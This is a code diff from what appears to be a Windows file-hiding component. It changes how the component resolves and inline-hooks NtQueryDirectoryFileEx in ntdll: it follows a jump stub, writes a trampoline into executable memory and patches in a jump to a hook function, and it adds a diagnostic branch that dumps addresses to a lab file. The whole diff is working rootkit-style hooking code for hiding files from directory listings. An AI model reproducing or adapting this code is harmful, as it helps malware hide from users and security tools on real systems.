@@ -211,35 +211,67 @@ int file_hide_install(PrefixTable *table)
         GetProcAddress(ntdll, "NtQueryDirectoryFileEx");
     if (g_original_ex) {
         BYTE *ex_ptr = (BYTE *)g_original_ex;
+        void *resolved_target = (void *)g_original_ex;
 
-        /* If the export is a forwarding stub (E9 = JMP rel32, typical
-           of hotpatching), follow the jump to reach the real syscall
-           stub and hook THAT instead.  Patching the 5-byte forwarder
-           would corrupt the adjacent function. */
         if (ex_ptr[0] == 0xE9) {
             INT32 disp = *(INT32 *)(ex_ptr + 1);
-            g_original_ex = (pNtQueryDirectoryFileEx)(ex_ptr + 5 + disp);
+            resolved_target = ex_ptr + 5 + disp;
         }
 
-        memcpy(g_saved_ex, (void *)g_original_ex, PATCH_SIZE);
+#ifdef FILE_HIDE_DIAG
+        {
+            HANDLE hf = CreateFileA("C:\\lab\\debug_resolved.bin",
+                                    GENERIC_WRITE, 0, NULL,
+                                    CREATE_ALWAYS, 0, NULL);
+            if (hf != INVALID_HANDLE_VALUE) {
+                DWORD w;
+                BYTE info[48];
+                /* 0-7:  export address (NtQueryDirectoryFileEx) */
+                *(UINT_PTR *)(info +  0) = (UINT_PTR)ex_ptr;
+                /* 8-15: resolved target address */
+                *(UINT_PTR *)(info +  8) = (UINT_PTR)resolved_target;
+                /* 16-23: NtQueryDirectoryFile address (for comparison) */
+                *(UINT_PTR *)(info + 16) = (UINT_PTR)g_original;
+                /* 24-39: first 16 bytes at resolved target */
+                memcpy(info + 24, resolved_target, 16);
+                /* 40-47: first 8 bytes at export (the E9 stub) */
+                memcpy(info + 40, ex_ptr, 8);
+                WriteFile(hf, info, sizeof(info), &w, NULL);
+                CloseHandle(hf);
+            }
+            /* DIAG: skip Ex hook installation entirely */
+        }
+#else
+        g_original_ex = (pNtQueryDirectoryFileEx)resolved_target;
 
-        g_trampoline_ex = (pNtQueryDirectoryFileEx)
-            VirtualAlloc(NULL, TRAMP_SIZE,
-                         MEM_COMMIT | MEM_RESERVE,
-                         PAGE_EXECUTE_READWRITE);
-        if (g_trampoline_ex) {
-            memcpy((void *)g_trampoline_ex, g_saved_ex, PATCH_SIZE);
-            write_abs_jmp((BYTE *)g_trampoline_ex + PATCH_SIZE,
-                          (BYTE *)g_original_ex + PATCH_SIZE);
+        /* Skip if resolved target IS NtQueryDirectoryFile
+           (already hooked above). */
+        if ((void *)g_original_ex == (void *)g_original) {
+            g_original_ex = NULL;
+        }
 
-            if (VirtualProtect((void *)g_original_ex, PATCH_SIZE,
-                               PAGE_EXECUTE_READWRITE, &oldProt)) {
-                write_abs_jmp((BYTE *)g_original_ex,
-                              (void *)HookedNtQueryDirectoryFileEx);
-                VirtualProtect((void *)g_original_ex, PATCH_SIZE,
-                               oldProt, &tmp);
+        if (g_original_ex) {
+            memcpy(g_saved_ex, (void *)g_original_ex, PATCH_SIZE);
+
+            g_trampoline_ex = (pNtQueryDirectoryFileEx)
+                VirtualAlloc(NULL, TRAMP_SIZE,
+                             MEM_COMMIT | MEM_RESERVE,
+                             PAGE_EXECUTE_READWRITE);
+            if (g_trampoline_ex) {
+                memcpy((void *)g_trampoline_ex, g_saved_ex, PATCH_SIZE);
+                write_abs_jmp((BYTE *)g_trampoline_ex + PATCH_SIZE,
+                              (BYTE *)g_original_ex + PATCH_SIZE);
+
+                if (VirtualProtect((void *)g_original_ex, PATCH_SIZE,
+                                   PAGE_EXECUTE_READWRITE, &oldProt)) {
+                    write_abs_jmp((BYTE *)g_original_ex,
+                                  (void *)HookedNtQueryDirectoryFileEx);
+                    VirtualProtect((void *)g_original_ex, PATCH_SIZE,
+                                   oldProt, &tmp);
+                }
             }
         }
+#endif
     }
 
     return 0;
